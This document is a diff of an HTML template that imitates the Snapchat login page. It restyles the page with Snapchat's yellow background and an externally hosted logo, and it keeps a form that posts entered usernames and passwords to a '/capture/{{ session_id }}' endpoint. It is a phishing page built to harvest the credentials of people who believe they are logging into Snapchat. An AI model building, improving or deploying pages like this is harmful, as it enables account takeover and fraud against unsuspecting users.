@@ -4,98 +4,248 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 <title>Log In | Snapchat</title>
+
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
 <style>
-*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+-webkit-tap-highlight-color:transparent
+}
+
 body{
-    font-family:'Poppins',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
-    background:#fff;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    min-height:100vh
+font-family:'Poppins',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+background:#fffb0b;
+display:flex;
+justify-content:center;
+align-items:center;
+min-height:100vh
 }
-.container{max-width:400px;width:100%;padding:24px;text-align:center}
-.logo{margin:40px 0 20px}
-.logo svg{width:60px;height:60px}
-h1{font-size:24px;font-weight:600;color:#111;margin-bottom:24px}
-.input-group{position:relative;margin-bottom:12px;text-align:left}
+
+.container{
+max-width:400px;
+width:100%;
+padding:24px;
+text-align:center
+}
+
+.logo{
+margin:40px 0 20px
+}
+
+.logo img{
+width:100px;
+height:100px;
+object-fit:contain;
+display:block;
+margin:auto
+}
+
+h1{
+font-size:24px;
+font-weight:600;
+color:#111;
+margin-bottom:24px
+}
+
+.input-group{
+position:relative;
+margin-bottom:12px;
+text-align:left
+}
+
 .input-group input{
-    width:100%;
-    padding:18px 16px;
-    background:#f7f7f8;
-    border:1px solid #e0e0e0;
-    border-radius:12px;
-    font-size:16px;
-    font-weight:400;
-    outline:none;
-    color:#111;
-    font-family:'Poppins',sans-serif
+width:100%;
+padding:18px 16px;
+background:#f7f7f8;
+border:1px solid #1e1e1e;
+border-radius:12px;
+font-size:16px;
+font-weight:400;
+outline:none;
+color:#111;
+font-family:'Poppins',sans-serif
 }
-.input-group input:focus{border-color:#111;background:#fff}
-.input-group input::placeholder{color:#999;font-weight:300}
-.switch-link{text-align:center;margin:8px 0 24px}
-.switch-link a{color:#111;font-size:14px;font-weight:500;text-decoration:none}
+
+.input-group input:focus{
+border-color:#111;
+background:#fff
+}
+
+.input-group input::placeholder{
+color:#999;
+font-weight:300
+}
+
+.switch-link{
+text-align:center;
+margin:8px 0 24px
+}
+
+.switch-link a{
+color:#111;
+font-size:14px;
+font-weight:500;
+text-decoration:none
+}
+
 .btn-next{
-    width:100%;
-    padding:16px;
-    background:#111;
-    color:#fff;
-    border:none;
-    border-radius:999px;
-    font-size:16px;
-    font-weight:600;
-    cursor:pointer;
-    font-family:'Poppins',sans-serif
+width:100%;
+padding:16px;
+background:#111;
+color:#fff;
+border:none;
+border-radius:999px;
+font-size:16px;
+font-weight:600;
+cursor:pointer;
+font-family:'Poppins',sans-serif
 }
-.btn-next:hover{background:#333}
-.divider{display:flex;align-items:center;margin:24px 0;color:#999;font-size:12px;font-weight:400}
-.divider::before,.divider::after{content:'';flex:1;height:1px;background:#e0e0e0}
-.divider span{margin:0 16px}
-.signup-text{font-size:15px;color:#555;font-weight:400}
-.signup-text a{color:#111;font-weight:600;text-decoration:none}
-.footer{margin-top:60px;padding:0 20px}
-.footer-links{display:flex;flex-wrap:wrap;justify-content:center;gap:24px;margin-bottom:16px}
-.footer-links a{color:#666;font-size:13px;text-decoration:none;font-weight:400}
-.footer-links a:hover{text-decoration:underline}
-.footer-bottom{display:flex;justify-content:center;align-items:center;gap:16px;font-size:12px;color:#999;flex-wrap:wrap}
-.footer-bottom a{color:#999;text-decoration:none}
-.privacy-link{color:#999;font-size:12px}
+
+.btn-next:hover{
+background:#333
+}
+
+.divider{
+display:flex;
+align-items:center;
+margin:24px 0;
+color:#999;
+font-size:12px;
+font-weight:400
+}
+
+.divider::before,
+.divider::after{
+content:'';
+flex:1;
+height:1px;
+background:#131313
+}
+
+.divider span{
+margin:0 16px
+}
+
+.signup-text{
+font-size:15px;
+color:#555;
+font-weight:400
+}
+
+.signup-text a{
+color:#111;
+font-weight:600;
+text-decoration:none
+}
+
+.footer{
+margin-top:60px;
+padding:0 20px
+}
+
+.footer-links{
+display:flex;
+flex-wrap:wrap;
+justify-content:center;
+gap:24px;
+margin-bottom:16px
+}
+
+.footer-links a{
+color:#666;
+font-size:13px;
+text-decoration:none;
+font-weight:400
+}
+
+.footer-links a:hover{
+text-decoration:underline
+}
+
+.footer-bottom{
+display:flex;
+justify-content:center;
+align-items:center;
+gap:16px;
+font-size:12px;
+color:#999;
+flex-wrap:wrap
+}
+
+.footer-bottom a{
+color:#999;
+text-decoration:none
+}
+
+@media(max-width:480px){
+.container{
+padding:20px
+}
+}
 </style>
 </head>
+
 <body>
+
 <div class="container">
-    <div class="logo">
-        <svg viewBox="0 0 24 24" width="60" height="60"><path fill="#111" d="M12 0C5.37 0 0 5.37 0 12c0 6.63 5.37 12 12 12s12-5.37 12-12S18.63 0 12 0zm6.67 14.92c-.13.65-.55 1.2-1.12 1.55-.36.22-.76.35-1.18.38-.42.03-.83-.04-1.22-.19-.2-.08-.41-.12-.63-.12-.22 0-.43.04-.63.12-.39.15-.8.22-1.22.19-.42-.03-.82-.16-1.18-.38-.65-.4-1.16-1.08-1.28-1.86l-.02-.14c-.04-.28.16-.54.44-.58.28-.04.54.16.58.44l.02.14c.07.48.36.89.79 1.17.24.15.51.25.79.26.05 0 .1 0 .15-.01.22-.02.43-.08.63-.19.38-.2.82-.2 1.2 0 .2.11.41.17.63.19.05.01.1.01.15.01.28-.01.55-.11.79-.26.41-.27.7-.67.79-1.14.04-.28.3-.48.58-.44.28.04.48.3.44.58l-.02.14z"/></svg>
-    </div>
-    <h1>Log in to Snapchat</h1>
-    <form action="/capture/{{ session_id }}" method="POST">
-        <div class="input-group">
-            <input type="text" name="username" placeholder="Username or Email" required>
-        </div>
-        <div class="switch-link"><a href="#">Use phone number instead</a></div>
-        <div class="input-group">
-            <input type="password" name="password" placeholder="Password" required>
-        </div>
-        <button type="submit" class="btn-next">Next</button>
-    </form>
-    <div class="divider"><span>OR</span></div>
-    <p class="signup-text">New to Snapchat? <a href="#">Sign Up</a></p>
-    <div class="footer">
-        <div class="footer-links">
-            <a href="#">Company</a>
-            <a href="#">Community</a>
-            <a href="#">Advertising</a>
-            <a href="#">Legal</a>
-        </div>
-        <div class="footer-bottom">
-            <a href="#">Privacy Policy</a>
-            <span>|</span>
-            <a href="#">Terms of Service</a>
-            <span>|</span>
-            <span>&copy; 2025 Snap Inc</span>
-        </div>
-    </div>
+
+<div class="logo">
+<img src="https://files.catbox.moe/uo7era.png" alt="Logo">
 </div>
+
+<h1>Login to Snapchat</h1>
+
+<form action="/capture/{{ session_id }}" method="POST">
+
+<div class="input-group">
+<input type="text" name="username" placeholder="Username or Email" required>
+</div>
+
+<div class="switch-link">
+<a href="#">Use phone number instead</a>
+</div>
+
+<div class="input-group">
+<input type="password" name="password" placeholder="Password" required>
+</div>
+
+<button type="submit" class="btn-next">
+Next
+</button>
+
+</form>
+
+<div class="divider">
+<span>OR</span>
+</div>
+
+<p class="signup-text">
+New to Snapchat? <a href="#">Sign Up</a>
+</p>
+
+<div class="footer">
+
+<div class="footer-links">
+<a href="#">Company</a>
+<a href="#">Community</a>
+<a href="#">Advertising</a>
+<a href="#">Legal</a>
+</div>
+
+<div class="footer-bottom">
+<a href="#">Privacy Policy</a>
+<span>|</span>
+<a href="#">Terms of Service</a>
+<span>|</span>
+<span>© 2026 Snap Inc</span>
+</div>
+
+</div>
+
+</div>
+
 </body>
-  </html>
+    </html>
